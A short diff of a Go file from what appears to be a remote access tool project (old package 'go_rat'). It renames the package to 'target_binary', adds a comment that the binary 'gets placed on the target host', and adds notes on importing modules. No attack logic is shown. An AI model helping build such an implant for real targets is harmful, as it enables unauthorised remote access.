@@ -1,5 +1,9 @@
-// make our module
-package go_rat
+/*/
+This is the file that will be compiled into the binary
+	that gets placed on the target host
+/*/
+// we have to name the module after the folder it's in
+package target_binary
 
 // import the libraries we need
 import (
@@ -12,7 +16,12 @@ import (
 	"net"
 	"os"
 	"strings"
-	/*/  IMPORTING MODULES YOU FIND ONLINE
+	/*/
+	IMPORTING MODULES FROM PARENT DIRECTORY
+		A useful way to make multiple binaries with common code
+		- depends on the folder structure and module naming
+
+	/*//*/  IMPORTING MODULES YOU FIND ONLINE
 		in the terminal in VSCODE, while in the package root directory,
 		append the following imports, as is, to the command "go get"
 
